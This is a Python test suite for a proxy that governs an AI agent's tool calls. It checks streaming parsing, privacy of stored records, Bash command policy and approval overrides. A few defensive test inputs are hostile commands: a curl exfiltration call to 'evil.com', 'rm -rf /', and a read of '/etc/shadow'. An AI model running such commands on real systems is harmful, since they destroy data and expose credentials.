    def _mock_streaming_client(self, sse_body: bytes):
        async def mock_aiter_lines():
            for line in sse_body.decode("utf-8").split("\r\n"):
                yield line

        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {"content-type": "text/event-stream"}
        mock_resp.aiter_lines = mock_aiter_lines
        mock_resp.aread = AsyncMock(return_value=b"")

        mock_stream_ctx = AsyncMock()
        mock_stream_ctx.__aenter__ = AsyncMock(return_value=mock_resp)
        mock_stream_ctx.__aexit__ = AsyncMock(return_value=False)

        mock_client = AsyncMock()
        mock_client.stream = MagicMock(return_value=mock_stream_ctx)
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock(return_value=False)
        return mock_client

    def test_anthropic_streaming_text_only_is_observed_buffered(self):
        proxy, chain_path = self._proxy_with_chain("qs053-stream-buffered-observed.jsonl")
        with patch("httpx.AsyncClient") as MockClient:
            MockClient.return_value = self._mock_streaming_client(self._TEXT_ONLY_SSE)
            status, _, _ = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": True}).encode(),
            ))
        self.assertEqual(status, 200)
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["event_type"], "proxy_request_observed")
        self.assertEqual(rows[0]["provider"], "anthropic")
        self.assertTrue(rows[0]["examined"])
        self.assertTrue(rows[0]["forwarded"])
        chain_path.unlink(missing_ok=True)

    def test_anthropic_streaming_text_only_is_observed_to_writer(self):
        proxy, chain_path = self._proxy_with_chain("qs053-stream-writer-observed.jsonl")

        class _FakeWriter:
            def __init__(self):
                self.buf = bytearray()

            def write(self, data: bytes):
                self.buf.extend(data)

            async def drain(self):
                return None

        writer = _FakeWriter()
        with patch("httpx.AsyncClient") as MockClient:
            MockClient.return_value = self._mock_streaming_client(self._TEXT_ONLY_SSE)
            _run(proxy.handle_streaming_to_writer(
                "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": True}).encode(), writer,
            ))
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["event_type"], "proxy_request_observed")
        self.assertEqual(rows[0]["provider"], "anthropic")
        self.assertTrue(rows[0]["examined"])
        chain_path.unlink(missing_ok=True)

    # QS-054: the live Anthropic streaming provider path — the exact path that
    # /anthropic/v1/messages with stream=true takes (handle_streaming_to_writer
    # with an AnthropicProvider) — must produce a governed ALLOW/DENY record for
    # a tool_use block, carrying the QS-052 provider field. No prior test drove
    # this path with a tool call, which let a regression hide behind the proxy.
    _TOOL_USE_SSE = "\r\n".join([
        "event: message_start",
        'data: {"type":"message_start","message":{"id":"msg_t","role":"assistant","content":[]}}',
        "",
        "event: content_block_start",
        'data: {"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"toolu_1","name":"Read","input":{}}}',
        "",
        "event: content_block_delta",
        'data: {"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":'
        + json.dumps(json.dumps({"file_path": os.path.join(_REPO_STR, "README.md")})) + "}}",
        "",
        "event: content_block_stop",
        'data: {"type":"content_block_stop","index":0}',
        "",
        "event: message_delta",
        'data: {"type":"message_delta","delta":{"stop_reason":"tool_use"}}',
        "",
        "event: message_stop",
        'data: {"type":"message_stop"}',
        "",
    ]).encode("utf-8")

    def test_anthropic_streaming_tool_use_is_governed_to_writer(self):
        from proxy.providers.anthropic import AnthropicProvider

        proxy, chain_path = self._proxy_with_chain("qs054-stream-tool-governed.jsonl")

        class _FakeWriter:
            def __init__(self):
                self.buf = bytearray()

            def write(self, data: bytes):
                self.buf.extend(data)

            async def drain(self):
                return None

        writer = _FakeWriter()
        with patch("httpx.AsyncClient") as MockClient:
            MockClient.return_value = self._mock_streaming_client(self._TOOL_USE_SSE)
            _run(proxy.handle_streaming_to_writer(
                "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": True}).encode(), writer,
                provider=AnthropicProvider(),
            ))
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        actions = [r for r in rows if r.get("event_type") is None and "policy_decision" in r]
        self.assertEqual(len(actions), 1, f"expected one governed decision, got rows={rows}")
        self.assertEqual(actions[0]["original_tool"], "Read")
        self.assertEqual(actions[0]["policy_decision"], "ALLOW")
        self.assertEqual(actions[0]["provider"], "anthropic")  # QS-052 provider field intact
        self.assertNotIn("developer_mode", actions[0])  # production posture, not watermarked
        chain_path.unlink(missing_ok=True)


# ===================================================================
# Privacy — no content storage
# ===================================================================

class TestPrivacy(unittest.TestCase):
    """Verify governance records don't contain conversation content."""

    def test_no_file_content_in_record(self):
        policy = _make_policy()
        record = mediate_decision(
            "Write",
            {"file_path": os.path.join(_REPO_STR, "test.txt"),
             "content": "SECRET_API_KEY=sk-12345"},
            policy=policy,
        )
        record_json = json.dumps(record)
        self.assertNotIn("SECRET_API_KEY", record_json)
        self.assertNotIn("sk-12345", record_json)

    def test_no_execution_output_in_record(self):
        """Records contain the command (for classification) but not its output."""
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "echo hello"},
            policy=policy,
        )
        # The command is in targets/evidence (needed for classification).
        # But execution output (what the command prints) is NOT in the record
        # because the proxy never executes — it only classifies the request.
        self.assertNotIn("execution_result", record)
        self.assertNotIn("stdout", json.dumps(record))


# ===================================================================
# Bash tool governance (Tier 2 operations)
# ===================================================================

class TestBashToolGovernance(unittest.TestCase):
    """Bash/execute tools are classified and governed."""

    def test_bash_git_push_denied(self):
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "git push origin main"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")
        cls = record["classification"]
        self.assertEqual(cls["scope"], "remote")

    def test_bash_ls_allowed(self):
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "ls -la " + _REPO_STR},
            policy=policy,
        )
        # ls is tier 2, should be allowed for local operations
        self.assertIn(record["policy_decision"], ["ALLOW", "DENY"])

    def test_bash_curl_denied(self):
        policy = _make_policy()
        record = mediate_decision(
            "Bash", {"command": "curl https://evil.com/exfil"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")


# ===================================================================
# Query parameter handling (D-027 regression)
# ===================================================================

class TestQueryParameterHandling(unittest.TestCase):
    """Endpoints with query parameters must still be detected correctly."""

    def _make_proxy(self):
        policy = _make_policy([_REPO_STR])
        return GovernanceProxy(
            upstream_base="http://fake-api.test",
            policy=policy,
        )

    def test_prepare_request_with_beta_query(self):
        """_prepare_request detects messages endpoint despite ?beta= query param."""
        proxy = self._make_proxy()
        body = json.dumps({"messages": [], "stream": True}).encode()
        url, _, is_messages, is_streaming = proxy._prepare_request(
            "POST", "/v1/messages?beta=prompt_caching_2024_09_30",
            {"content-type": "application/json"}, body,
        )
        self.assertTrue(is_messages, "Should detect /v1/messages with query params")
        self.assertTrue(is_streaming, "Should detect stream=true with query params")
        self.assertIn("?beta=", url, "Query params must be preserved in upstream URL")

    def test_prepare_request_without_query(self):
        """_prepare_request still works without query parameters."""
        proxy = self._make_proxy()
        body = json.dumps({"messages": [], "stream": True}).encode()
        _, _, is_messages, is_streaming = proxy._prepare_request(
            "POST", "/v1/messages", {"content-type": "application/json"}, body,
        )
        self.assertTrue(is_messages)
        self.assertTrue(is_streaming)

    def test_prepare_request_non_messages_with_query(self):
        """Non-messages endpoints with query params are not misidentified."""
        proxy = self._make_proxy()
        _, _, is_messages, _ = proxy._prepare_request(
            "GET", "/v1/models?limit=10", {}, b"",
        )
        self.assertFalse(is_messages)


# ===================================================================
# End-to-end ProxyServer integration test (raw HTTP pipeline)
# ===================================================================

class TestProxyServerEndToEnd(unittest.TestCase):
    """Test the full ProxyServer pipeline: raw HTTP → SSE parsing → governance.

    This tests the code path that unit tests miss: ProxyServer._handle_client
    raw HTTP parsing, header extraction, body reading, streaming detection,
    and SSE event processing with real TCP connections.
    """

    def _build_sse_stream(self, tool_name: str, tool_id: str, tool_input: dict,
                          index: int = 1) -> bytes:
        """Build a realistic Anthropic SSE stream with a tool_use block."""
        input_json = json.dumps(tool_input)
        # Split input JSON into fragments (like real streaming)
        mid = len(input_json) // 2
        frag1 = input_json[:mid]
        frag2 = input_json[mid:]

        events = [
            # message_start
            ('message_start', json.dumps({
                "type": "message_start",
                "message": {"id": "msg_test", "type": "message", "role": "assistant",
                            "content": [], "model": "claude-opus-4-6",
                            "stop_reason": None, "stop_sequence": None,
                            "usage": {"input_tokens": 100, "output_tokens": 0}},
            })),
            # Text block
            ('content_block_start', json.dumps({
                "type": "content_block_start", "index": 0,
                "content_block": {"type": "text", "text": ""},
            })),
            ('content_block_delta', json.dumps({
                "type": "content_block_delta", "index": 0,
                "delta": {"type": "text_delta", "text": "Let me read that file."},
            })),
            ('content_block_stop', json.dumps({
                "type": "content_block_stop", "index": 0,
            })),
            # Tool use block
            ('content_block_start', json.dumps({
                "type": "content_block_start", "index": index,
                "content_block": {"type": "tool_use", "id": tool_id,
                                  "name": tool_name, "input": {}},
            })),
            ('content_block_delta', json.dumps({
                "type": "content_block_delta", "index": index,
                "delta": {"type": "input_json_delta", "partial_json": frag1},
            })),
            ('content_block_delta', json.dumps({
                "type": "content_block_delta", "index": index,
                "delta": {"type": "input_json_delta", "partial_json": frag2},
            })),
            ('content_block_stop', json.dumps({
                "type": "content_block_stop", "index": index,
            })),
            # message_delta and stop
            ('message_delta', json.dumps({
                "type": "message_delta",
                "delta": {"stop_reason": "tool_use", "stop_sequence": None},
                "usage": {"output_tokens": 50},
            })),
            ('message_stop', json.dumps({
                "type": "message_stop",
            })),
        ]

        lines = []
        for event_type, data in events:
            lines.append(f"event: {event_type}")
            lines.append(f"data: {data}")
            lines.append("")  # blank line = event boundary

        lines.append("event: done")
        lines.append("data: [DONE]")
        lines.append("")
        return "\r\n".join(lines).encode("utf-8")

    def test_streaming_tool_use_detected_and_recorded(self):
        """Streaming path: SSE stream with tool_use → mediated → chain recorded.

        Tests _handle_streaming_buffered (the buffered variant used for testing)
        which shares the same StreamingToolCollector as handle_streaming_to_writer.
        This validates SSE parsing, tool_use detection, and chain recording.
        """
        chain_path = Path(os.environ.get("TMPDIR", "/private/tmp/claude-501")) / "test_e2e_chain.jsonl"
        chain_path.unlink(missing_ok=True)

        from proxy.server import ChainRecorder, GovernanceProxy

        recorder = ChainRecorder(chain_path)
        policy = _make_policy()

        file_path = os.path.join(_REPO_STR, "README.md")
        sse_body = self._build_sse_stream(
            "Read", "toolu_test1", {"file_path": file_path}, index=1,
        )

        proxy = GovernanceProxy(
            upstream_base="http://fake",
            policy=policy,
            chain_recorder=recorder,
        )

        # Mock httpx streaming response to return our SSE data
        async def mock_aiter_lines():
            for line in sse_body.decode("utf-8").split("\r\n"):
                yield line

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "text/event-stream"}
            mock_resp.aiter_lines = mock_aiter_lines
            mock_resp.aread = AsyncMock(return_value=b"")

            mock_stream_ctx = AsyncMock()
            mock_stream_ctx.__aenter__ = AsyncMock(return_value=mock_resp)
            mock_stream_ctx.__aexit__ = AsyncMock(return_value=False)

            mock_client = AsyncMock()
            mock_client.stream = MagicMock(return_value=mock_stream_ctx)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": True}).encode(),
            ))

        self.assertEqual(status, 200)
        body_str = body.decode("utf-8")
        self.assertIn("tool_use", body_str, "Response should contain tool_use block")
        self.assertIn("Read", body_str, "Response should contain tool name")

        # Verify chain recording
        self.assertTrue(chain_path.exists(), "Chain file should exist")
        lines = [l for l in chain_path.read_text().strip().split("\n") if l.strip()]
        self.assertGreaterEqual(len(lines), 1,
                                f"Should have at least 1 chain record, got {len(lines)}")

        record = json.loads(lines[0])
        self.assertEqual(record["record_type"], "mediated_decision")
        self.assertEqual(record["original_tool"], "Read")
        self.assertEqual(record["policy_decision"], "ALLOW")
        self.assertIn("classification", record)
        self.assertIn("confidence_tier", record["classification"])

        chain_path.unlink(missing_ok=True)

    def test_non_streaming_tool_use_recorded(self):
        """Non-streaming path also records governance decisions."""
        chain_path = Path(os.environ.get("TMPDIR", "/private/tmp/claude-501")) / "test_e2e_nonstream.jsonl"
        chain_path.unlink(missing_ok=True)

        from proxy.server import ChainRecorder, GovernanceProxy

        recorder = ChainRecorder(chain_path)
        policy = _make_policy()
        proxy = GovernanceProxy(
            upstream_base="http://fake",
            policy=policy,
            chain_recorder=recorder,
        )

        file_path = os.path.join(_REPO_STR, "README.md")
        response_body = json.dumps({
            "id": "msg_1", "type": "message", "role": "assistant",
            "content": [
                {"type": "text", "text": "Reading the file."},
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": file_path}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        self.assertTrue(chain_path.exists())
        lines = [l for l in chain_path.read_text().strip().split("\n") if l.strip()]
        self.assertEqual(len(lines), 1)
        record = json.loads(lines[0])
        self.assertEqual(record["record_type"], "mediated_decision")
        self.assertEqual(record["original_tool"], "Read")
        self.assertEqual(record["policy_decision"], "ALLOW")

        chain_path.unlink(missing_ok=True)


# ===================================================================
# Dashboard activity rendering (readout integration)
# ===================================================================

class TestActivityEntryEnrichment(unittest.TestCase):
    """Mediated decision activity entries include target and action_type."""

    def test_action_decision_includes_target(self):
        """v2 mediated decision entries expose the primary target in detail."""
        sys.path.insert(0, str(SCRIPTS))
        from readout import _normalize_activity_entry

        rec = {
            "record_version": "2.0",
            "record_type": "mediated_decision",
            "timestamp_utc": "2026-04-04T10:00:00Z",
            "request_id": "req-1",
            "original_tool": "Read",
            "classification": {
                "action_type": "read",
                "targets": [os.path.join(_REPO_STR, "README.md")],
                "scope": "repository",
                "confidence_tier": 1,
            },
            "policy_decision": "ALLOW",
            "record_hash": "sha256:abc",
        }
        entry = _normalize_activity_entry(rec, sequence_position=1)
        self.assertIsNotNone(entry)
        self.assertEqual(entry["event_category"], "action_decision")
        self.assertEqual(entry["detail"]["tool_name"], "Read")
        self.assertEqual(entry["detail"]["target"], os.path.join(_REPO_STR, "README.md"))
        self.assertEqual(entry["detail"]["action_type"], "read")
        self.assertEqual(entry["detail"]["confidence_tier"], 1)
        self.assertIn("Read", entry["summary"])
        self.assertIn("ALLOW", entry["summary"])

    def test_action_decision_no_unknown_for_v2(self):
        """v2 records with original_tool should never show 'unknown'."""
        sys.path.insert(0, str(SCRIPTS))
        from readout import _normalize_activity_entry

        rec = {
            "record_version": "2.0",
            "record_type": "mediated_decision",
            "timestamp_utc": "2026-04-04T10:00:00Z",
            "request_id": "req-2",
            "original_tool": "Write",
            "classification": {
                "action_type": "write",
                "targets": ["/tmp/test.txt"],
                "scope": "local",
                "confidence_tier": 1,
            },
            "policy_decision": "DENY",
            "record_hash": "sha256:def",
        }
        entry = _normalize_activity_entry(rec, sequence_position=1)
        self.assertNotIn("unknown", entry["summary"])
        self.assertEqual(entry["detail"]["tool_name"], "Write")

    def test_non_action_activity_entries_have_display_labels(self):
        """Policy and approval events expose labels for Recent Activity rows."""
        sys.path.insert(0, str(SCRIPTS))
        from readout import _normalize_activity_entry

        policy = _normalize_activity_entry({
            "record_type": "non_action_event",
            "event_type": "policy_rules_changed",
            "timestamp_utc": "2026-04-04T10:00:00Z",
            "current_policy_rules_hash": "sha256:" + "a" * 64,
            "previous_policy_rules_hash": "sha256:" + "b" * 64,
            "policy_path": "/tmp/policy-rules.json",
            "response": "deny_all_until_acknowledged",
            "record_hash": "sha256:abc",
        }, sequence_position=1)
        approval = _normalize_activity_entry({
            "record_type": "non_action_event",
            "event_type": "opaque_artifact_approval",
            "timestamp_utc": "2026-04-04T10:00:01Z",
            "artifact_identity": "Bash",
            "approving_operator": "gregkeeter",
            "governed_family": "mcp_tools_v1",
            "deployment_context": "default",
            "policy_version": "baseline-v1",
            "record_hash": "sha256:def",
        }, sequence_position=2)

        self.assertEqual(policy["summary"], "Policy Changed")
        self.assertEqual(policy["detail"]["tool_name"], "Policy Changed")
        self.assertEqual(approval["summary"], "Bash Approved")
        self.assertEqual(approval["detail"]["tool_name"], "Bash")
        self.assertEqual(approval["detail"]["status"], "approved")


class TestRecordDetailV2Target(unittest.TestCase):
    """Record detail page should extract target from v2 classification."""

    def test_v2_record_has_target_in_classification(self):
        """_renderGovernedRecord reads classification.targets for v2 records."""
        # This is a contract test: v2 records store targets in classification.targets,
        # not as a top-level 'target' field. The dashboard must extract from there.
        rec = {
            "record_version": "2.0",
            "record_type": "mediated_decision",
            "original_tool": "Read",
            "classification": {
                "action_type": "read",
                "targets": ["/repo/README.md"],
                "scope": "local",
                "confidence_tier": 1,
            },
            "policy_decision": "ALLOW",
        }
        # Verify that there is no top-level 'target' field
        self.assertNotIn("target", rec)
        # Verify that the target IS in classification.targets
        self.assertEqual(rec["classification"]["targets"][0], "/repo/README.md")
        # The normalization should extract it
        sys.path.insert(0, str(SCRIPTS))
        from readout import _normalize_activity_entry
        entry = _normalize_activity_entry(rec, sequence_position=1)
        self.assertIsNotNone(entry)
        self.assertEqual(entry["detail"]["target"], "/repo/README.md")


# ===================================================================
# Approval override: deny → approve → allow
# ===================================================================

class TestApprovalOverride(unittest.TestCase):
    """Proxy allows previously-denied operations when approved."""

    def test_denied_then_approved_by_tool_name(self):
        """An operation denied by policy is allowed after tool-name approval."""
        from approval_store import ApprovalStore

        policy = _make_policy(base_dirs=[_REPO_STR])

        # First: verify the operation is denied without approval
        record_deny = mediate_decision(
            "Bash", {"command": "rm -rf /"},
            policy=policy,
        )
        self.assertEqual(record_deny["policy_decision"], "DENY")

        # Now create an approval store with Bash approved
        store = ApprovalStore()
        store.ingest_approval({
            "artifact_identity": "Bash",
            "approving_operator": "test_operator",
            "governed_family": "mcp_tools_v1",
            "deployment_context": "default",
            "policy_version": "baseline-v1",
        })

        # Same operation with approval store → ALLOW
        record_allow = mediate_decision(
            "Bash", {"command": "rm -rf /"},
            policy=policy,
            approval_store=store,
        )
        self.assertEqual(record_allow["policy_decision"], "ALLOW")
        self.assertEqual(record_allow["matched_rule"], "approved_lookup")

    def test_tool_name_approval_is_case_insensitive(self):
        """Approval for bash matches the Bash tool name recorded by the proxy."""
        from approval_store import ApprovalStore

        policy = _make_policy(base_dirs=[_REPO_STR])
        store = ApprovalStore()
        store.ingest_approval({
            "artifact_identity": "bash",
            "approving_operator": "test_operator",
            "governed_family": "mcp_tools_v1",
            "deployment_context": "default",
            "policy_version": "baseline-v1",
        })

        record = mediate_decision(
            "Bash", {"command": "rm -rf /"},
            policy=policy,
            approval_store=store,
        )

        self.assertEqual(record["policy_decision"], "ALLOW")
        self.assertEqual(record["matched_rule"], "approved_lookup")

    def test_denied_not_overridden_without_matching_approval(self):
        """Approval for a different tool does not override denial."""
        from approval_store import ApprovalStore

        policy = _make_policy(base_dirs=[_REPO_STR])
        store = ApprovalStore()
        store.ingest_approval({
            "artifact_identity": "Read",
            "approving_operator": "test_operator",
            "governed_family": "mcp_tools_v1",
            "deployment_context": "default",
            "policy_version": "baseline-v1",
        })

        record = mediate_decision(
            "Bash", {"command": "rm -rf /"},
            policy=policy,
            approval_store=store,
        )
        self.assertEqual(record["policy_decision"], "DENY")

    def test_allowed_operations_not_affected_by_approval_store(self):
        """Operations allowed by policy stay allowed regardless of store."""
        from approval_store import ApprovalStore

        policy = _make_policy(base_dirs=[_REPO_STR])
        store = ApprovalStore()

        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy,
            approval_store=store,
        )
        self.assertEqual(record["policy_decision"], "ALLOW")
        self.assertNotEqual(record["matched_rule"], "approved_lookup")

    def test_approval_by_target_path(self):
        """Approval by target path overrides denial."""
        from approval_store import ApprovalStore

        policy = _make_policy(base_dirs=[_REPO_STR])
        store = ApprovalStore()
        store.ingest_approval({
            "artifact_identity": "/etc/shadow",
            "approving_operator": "test_operator",
            "governed_family": "mcp_tools_v1",
            "deployment_context": "default",
            "policy_version": "baseline-v1",
        })

        record = mediate_decision(
            "Read", {"file_path": "/etc/shadow"},
            policy=policy,
            approval_store=store,
        )
        self.assertEqual(record["policy_decision"], "ALLOW")
        self.assertEqual(record["matched_rule"], "approved_lookup")


if __name__ == "__main__":
    unittest.main()
